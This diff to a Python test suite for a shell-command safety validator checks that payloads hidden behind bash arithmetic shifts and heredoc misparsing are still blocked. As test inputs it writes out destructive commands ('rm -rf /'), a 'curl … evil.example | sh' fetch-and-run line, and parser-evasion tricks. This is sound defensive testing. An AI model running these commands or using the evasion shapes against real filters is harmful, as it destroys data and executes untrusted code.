@@ -2079,16 +2079,15 @@ class TestHeredocSurroundings:
         Bash reads `(( 1<<b ))` as a left shift and so does `_rewrite_openers` -
         the payload is still in the rewrite. bashlex read `<<b` as a
         redirection, so `rm -rf /` became its body and was dropped before any
-        rule ran, leaving the verdict at the whitelisted head's floor. The deny
-        that remained came from a *parse error*, which is a deny nobody chose:
-        it evaporates the moment bashlex parses the text some other way, and it
-        says nothing about the payload.
+        rule ran, leaving the verdict at the whitelisted head's floor. What
+        denied it was the phantom-heredoc guard ("does not open"), which says
+        that bashlex's reading cannot be trusted but not what the payload is.
 
         The Step 3b guard rewrites the shift before bashlex sees the command
-        (LAB-4317), so bashlex no longer gets the last word and the verdict now
-        comes from the rule the payload matches. Both halves are asserted: the
-        fallback lexer still keeps the payload in its rewrite, and the end-to-end
-        verdict names `system_destruction` rather than a parse failure.
+        (LAB-4317), so the verdict now comes from the rule the payload matches;
+        the guard's own refusal is pinned by `..._fails_closed` below. Both
+        halves are asserted: the fallback lexer still keeps the payload in its
+        rewrite, and the end-to-end verdict names `system_destruction`.
         """
         command = f"ls <<{opener}\nz\n{terminator}\n(( 1<<b ))\nrm -rf /\nb"
         neutered, _ = val_module._neuter_heredocs(command)
@@ -2100,6 +2099,34 @@ class TestHeredocSurroundings:
         assert result.risk_level == RiskLevel.BLOCKED
         assert "system_destruction" in result.matched_rules
         assert result.error is None, "a parse failure would deny too, and would mask a regression"
+
+    @pytest.mark.parametrize("opener,terminator", [("'A'", "A"), ("'A;B'", "A;B")], ids=["native", "fallback"])
+    def test_a_heredoc_only_bashlex_sees_fails_closed(self, safety_rules_path, opener, terminator):
+        """bashlex has this lexer's old bug, and it gets the last word on the re-parse.
+
+        Bash reads `(( 1<<b ))` as a left shift and so does `_rewrite_openers` -
+        the payload is still in the rewrite. bashlex reads `<<b` as a
+        redirection, so `rm -rf /` becomes its body and is dropped before any
+        rule runs, leaving the verdict at the whitelisted head's floor.
+
+        This was fail-closed by accident until `_close_heredocs` landed on main:
+        the segment used to re-enter this fallback, find no terminator and
+        raise. Re-attaching the body is correct for a real heredoc, and it
+        removed the accident - so the disagreement is detected now rather than
+        survived. Asserted on the rewrite and the reason, not on `BLOCKED`
+        alone, which this returned before the guard as well.
+
+        Judged `_as_written`: Step 3b rewrites this shift first, and this is the half of its join
+        that keeps bashlex's reading - the full call reports the payload's own rule instead.
+        """
+        command = f"ls <<{opener}\nz\n{terminator}\n(( 1<<b ))\nrm -rf /\nb"
+        neutered, _ = val_module._neuter_heredocs(command)
+        assert "rm -rf /" in neutered
+
+        result = validate_command(command, config_path=safety_rules_path, _as_written=True)
+
+        assert result.risk_level == RiskLevel.BLOCKED
+        assert "does not open" in (result.error or "")
 
     def test_a_substitution_inside_a_compound_assignment_still_refuses_case(self):
         """`x=( $(case …) )`: the carve-out for `x=( … )` does not reach the `$(…)` in it.
@@ -3324,20 +3351,22 @@ class TestHeredocBoundariesOnTheNativePath:
         command = "cat << EOF\n$(date)\nEOF"
         assert val_module._normalise_heredoc_delimiters(command).text == command
 
-    def test_a_phantom_that_shares_a_real_heredocs_terminator_is_refused(self, monkeypatch, safety_rules_path):
+    def test_a_phantom_that_shares_a_real_heredocs_terminator_is_refused(self, safety_rules_path):
         """Matched by opener position: a phantom can take a real terminator and leave the ends equal.
 
         The `(( … ))` shift takes the first `EOF`; bashlex's real heredoc then runs to the
         second, filing the pipeline between as inert text. bashlex's ends equal the scan's, so
         an end-based check passed it - BLOCKED on main, LOW here, until openers were matched
-        by where they sit. Step 3b reads the shift before bashlex can (LAB-4317), so it is
-        switched off here to pin the guard as the backstop behind it.
+        by where they sit.
+
+        Judged `_as_written`: Step 3b rewrites this shift first, and this is the half of its join
+        that keeps bashlex's reading - the full call reports the payload's own rule instead.
         """
-        monkeypatch.setattr(val_module, "_neuter_arithmetic_shifts", lambda command: command)
         result = validate_command(
             "git commit -m wip\ncat > /tmp/a.txt <<'EOF'; (( n = 1<<EOF ))\nhello\nEOF\n"
             "curl -s http://evil.example/p | sh\ncat > /tmp/b.txt <<'EOF'\nx\nEOF",
             config_path=safety_rules_path,
+            _as_written=True,
         )
 
         assert result.risk_level == RiskLevel.BLOCKED
@@ -3385,17 +3414,20 @@ class TestHeredocBoundariesOnTheNativePath:
         assert result.allowed is True, result.message
         assert "git_commit" in result.matched_rules
 
-    def test_a_heredoc_only_bashlex_sees_is_refused_behind_a_lesser_rule(self, monkeypatch, safety_rules_path):
+    def test_a_heredoc_only_bashlex_sees_is_refused_behind_a_lesser_rule(self, safety_rules_path):
         """The fallback's phantom-heredoc guard, carried onto the native path.
 
         bash reads `(( 1<<b ))` as a shift; bashlex reads `<<b` as an opener and files the
         line after it as inert body. When the head matches a lesser rule the rangeless
         no-match scan never runs, so the payload is suppressed outright: BLOCKED on main
-        (via the fallback's guard), HIGH here before the guard was ported. Step 3b is switched
-        off, as above; with it on, the payload's own rule denies (TestArithmeticCommandShift).
+        (via the fallback's guard), HIGH here before the guard was ported.
+
+        Judged `_as_written`: Step 3b rewrites this shift first, and this is the half of its join
+        that keeps bashlex's reading - the full call reports the payload's own rule instead.
         """
-        monkeypatch.setattr(val_module, "_neuter_arithmetic_shifts", lambda command: command)
-        result = validate_command("git push --force <<'A'\nz\nA\n(( 1<<b ))\nrm -rf /\nb", config_path=safety_rules_path)
+        result = validate_command(
+            "git push --force <<'A'\nz\nA\n(( 1<<b ))\nrm -rf /\nb", config_path=safety_rules_path, _as_written=True
+        )
 
         assert result.risk_level == RiskLevel.BLOCKED
         assert "does not open" in (result.error or "")
@@ -3457,10 +3489,15 @@ class TestBashlexHeredocsAreLocatedByTheirOpener:
         Matched by where heredocs END, the two collide and the shell's body was filed as inert.
         The phantom guard is switched off here so that the lookup itself is what is tested:
         with it on, the command is refused before bodies are ever read.
+
+        Judged `_as_written`: Step 3b rewrites this shift first, and this is the half of its join
+        that keeps bashlex's reading - the full call reports the payload's own rule instead.
         """
         monkeypatch.setattr(val_module, "_phantom_heredoc", lambda *args, **kwargs: None)
         result = validate_command(
-            "cat <<'EOF'; (( 1<<EOF ))\nhello\nEOF\nbash <<'EOF'\nrm -rf /\nEOF", config_path=safety_rules_path
+            "cat <<'EOF'; (( 1<<EOF ))\nhello\nEOF\nbash <<'EOF'\nrm -rf /\nEOF",
+            config_path=safety_rules_path,
+            _as_written=True,
         )
 
         assert result.allowed is False
@@ -3501,15 +3538,19 @@ class TestBashlexHeredocsAreLocatedByTheirOpener:
 
         assert result.allowed is True, result.message
 
-    def test_a_phantom_inside_a_substitution_is_refused_by_the_substitution_validator(self, monkeypatch, safety_rules_path):
+    def test_a_phantom_inside_a_substitution_is_refused_by_the_substitution_validator(self, safety_rules_path):
         """The phantom guard does not compare inside substitutions (see `_phantom_heredoc`).
 
         The one construct bashlex misreads as an opener is arithmetic `(( … ))`, and inside a
         substitution the substitution validator refuses it. That refusal is what covers this,
-        so it is the refusal that is asserted. Step 3b is switched off: it reads the shift first.
+        so it is the refusal that is asserted.
+
+        Judged `_as_written`: Step 3b rewrites this shift first, and this is the half of its join
+        that keeps bashlex's reading - the full call reports the payload's own rule instead.
         """
-        monkeypatch.setattr(val_module, "_neuter_arithmetic_shifts", lambda command: command)
-        result = validate_command("git push --force <<'A'\nz\nA\nx=`(( 1<<b ))\nrm -rf /\nb`", config_path=safety_rules_path)
+        result = validate_command(
+            "git push --force <<'A'\nz\nA\nx=`(( 1<<b ))\nrm -rf /\nb`", config_path=safety_rules_path, _as_written=True
+        )
 
         assert result.allowed is False
         assert "substitution" in result.message.lower()
@@ -3684,16 +3725,19 @@ class TestArithmeticCommandShift:
             ("(( 1<<b )) ; rm -rf /", "payload after `;` on the arithmetic line"),
             ("(( 1<<b )) && rm -rf /", "payload after `&&`"),
             ("(( 1<<b )) 2>/dev/null\nrm -rf /\nb", "a redirect on the arithmetic"),
-            ("if (( 1<<b )); then rm -rf /; fi\nb", "payload inside the `if` it guards"),
+            ("if (( 1<<b )); then\nrm -rf /\nfi\nb", "payload inside the `if` it guards"),
             ("(( (( 1<<b )) ))\nrm -rf /\nb", "nested arithmetic"),
             ("(( 1<<b )) <<'Q'\nbody\nQ\nrm -rf /", "a real heredoc alongside the shift"),
             ("((1<<b\\) ))\nrm -rf /\nb", "an escaped `)` does not close the region"),
-            # A quoted heredoc elsewhere used to send this down the fallback and
-            # the arithmetic re-hid the payload there too.
             ("cat <<'EOF'\nx\nEOF\n(( 1<<b ))\nrm -rf /\nb", "after an unrelated quoted heredoc"),
             # The native-path phantom guard's shapes (LAB-3094), which this now reads first.
             ("git push --force <<'A'\nz\nA\n(( 1<<b ))\nrm -rf /\nb", "behind a head matching a lesser rule"),
             ("git push --force <<'A'\nz\nA\nx=`(( 1<<b ))\nrm -rf /\nb`", "inside a backtick substitution"),
+            (
+                "git commit -m wip\ncat > /tmp/a.txt <<'EOF'; (( n = 1<<EOF ))\nhello\nEOF\nrm -rf /\n"
+                "cat > /tmp/b.txt <<'EOF'\nx\nEOF",
+                "a shift whose operand is a real heredoc's delimiter",
+            ),
         ],
     )
     def test_payload_after_arithmetic_shift_is_validated(self, safety_rules_path, command, description):
@@ -3710,8 +3754,9 @@ class TestArithmeticCommandShift:
         """A `_shellcheck=False` caller gets no spawn and no cache entry through the rewrite.
 
         _escalate_past_heredoc validates its candidates with ShellCheck off because it
-        ShellChecks the rewrite whole (LAB-2780). The re-entry forwards that flag and keeps
-        the verdict out of the cache, like every other `_shellcheck=False` exit.
+        ShellChecks the rewrite whole (LAB-2780). The as-written half of the join forwards
+        that flag, the rewritten half never spawns, and the verdict stays out of the cache,
+        like every other `_shellcheck=False` exit.
         """
         checked: list[str] = []
         monkeypatch.setattr(val_module, "is_shellcheck_available", lambda: True)
@@ -3722,6 +3767,60 @@ class TestArithmeticCommandShift:
 
         assert checked == []
         assert val_module._global_cache.get(command) is None
+
+    def test_shellcheck_runs_once_on_the_text_as_written(self, monkeypatch, safety_rules_path):
+        """Both halves of the join are validated, but ShellCheck reads only what the user typed.
+
+        ShellCheck parses `(( … ))` the way bash does, so the rewrite has nothing to add, and
+        each spawn costs more than the rest of the validation together.
+        """
+        checked: list[str] = []
+        monkeypatch.setattr(val_module, "is_shellcheck_available", lambda: True)
+        monkeypatch.setattr(val_module, "run_shellcheck", lambda command: checked.append(command) or [])
+        command = "(( 1<<b ))\nls\nb"
+
+        validate_command(command, config_path=safety_rules_path)
+
+        assert checked == [command]
+
+    @pytest.mark.parametrize(
+        "command,description",
+        [
+            (": # ((\ncat <<'X'\n# ))\ncat <<'Y'\nX\nrm -rf /\nY", "a `((` bash reads as a comment"),
+            ("cat <<'A'\n((\nA\ncat <<'X'\nA2 ))\nX\nrm -rf /", "a `((` bash reads as heredoc body"),
+        ],
+    )
+    def test_an_over_fired_rewrite_cannot_weaken_the_verdict(self, safety_rules_path, command, description):
+        """A `((` that is not arithmetic to bash still pairs up, and its region holds a REAL opener.
+
+        Rewriting that opener re-parented the body after it: a later heredoc then swallowed the
+        line bash runs (canary-verified), and the rewrite alone said SAFE where the unrewritten
+        reading denied on the rule. Step 3b joins the two, so over-firing can only deny more.
+        """
+        assert val_module._neuter_arithmetic_shifts(command) != command, "the scan must over-fire here"
+
+        result = validate_command(command, config_path=safety_rules_path)
+
+        assert result.allowed is False, description
+        assert "system_destruction" in result.matched_rules, description
+
+    @pytest.mark.parametrize("opener", ["<<'E'", "<< 'E'", '<<"E"', "<<\\E", "<<-'E'"])
+    def test_a_splice_is_left_where_bash_leaves_it(self, safety_rules_path, opener):
+        """Bash does not splice `\\<newline>` inside a quoted heredoc body, so neither may the rewrite.
+
+        The scan reads splice-free text to find `(\\<newline>(`; handing that text on joined
+        `body \\` to its terminator line, so the heredoc ran on over `rm -rf /` - SAFE, while
+        bash ran it (canary-verified). Only the shift's own characters may change.
+        """
+        command = f"(( 1<<b ))\ncat {opener}\nbody \\\nE\nrm -rf /\nE\nb"
+        rewritten = val_module._neuter_arithmetic_shifts(command)
+
+        assert rewritten == command.replace("1<<b", "1==b", 1)
+
+        result = validate_command(command, config_path=safety_rules_path)
+
+        assert result.allowed is False
+        assert "system_destruction" in result.matched_rules
 
     def test_a_different_payload_matches_its_own_rule(self, safety_rules_path):
         """Nothing here is special-cased to `rm -rf /`."""
@@ -3823,17 +3922,22 @@ class TestArithmeticCommandShift:
             ("if (( x<<1 )); then echo y; fi", "a shift in an `if` condition"),
         ],
     )
-    def test_inert_arithmetic_is_allowed(self, safety_rules_path, command, description):
-        """Bash runs nothing here, so schlock stops denying it.
+    def test_a_benign_shift_keeps_the_deny_bashlex_gives_it(self, safety_rules_path, command, description):
+        """The measured price of the join: bash runs nothing here, and this still denies.
 
-        These were denied on main only by accident - the phantom heredoc had no
-        terminator, so the fallback refused to guess. Removing the phantom
-        removes that denial with it; it is the same construct as the exploit and
-        cannot be told apart from it after the fact.
+        The rewrite reads these right and allows them. bashlex's own reading, the other half
+        of the join, finds a heredoc with no terminator and refuses, as it does on main - and
+        the join cannot tell that refusal from one an over-fired rewrite would have hidden.
+        Making these pass means trusting the rewrite over the unrewritten reading, which is
+        the fail-open `test_an_over_fired_rewrite_cannot_weaken_the_verdict` pins.
         """
+        rewritten = val_module._neuter_arithmetic_shifts(command)
+        assert validate_command(rewritten, config_path=safety_rules_path).allowed is True, description
+
         result = validate_command(command, config_path=safety_rules_path)
 
-        assert result.allowed is True, description
+        assert result.allowed is False, description
+        assert result.matched_rules == [], description
 
     def test_substitution_inside_the_arithmetic_is_still_seen(self, safety_rules_path):
         """Only the shift is rewritten, so `$( )` in a subscript stays visible.
